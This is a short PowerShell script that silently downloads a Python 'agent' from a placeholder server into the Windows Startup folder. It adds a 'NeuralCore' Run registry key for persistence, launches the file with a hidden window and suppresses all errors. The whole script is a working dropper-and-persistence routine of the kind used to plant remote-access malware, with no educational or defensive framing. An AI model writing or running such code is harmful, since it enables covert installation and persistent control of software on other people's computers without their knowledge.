$url = "http://your-server-ip:5000/api/download/agent"
$output = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\neural_agent.pyw"

# Download the agent silently
try {
    Invoke-WebRequest -Uri $url -OutFile $output
    
    # Persistence via Registry (Alternative to Startup folder)
    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $Name = "NeuralCore"
    $Value = "pythonw.exe `"$output`""
    
    if (-not (Get-ItemProperty -Path $RegPath -Name $Name -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path $RegPath -Name $Name -Value $Value -PropertyType String
    }
    
    # Run the agent immediately
    Start-Process pythonw.exe -ArgumentList "`"$output`"" -WindowStyle Hidden
} catch {
    # Silent fail
}
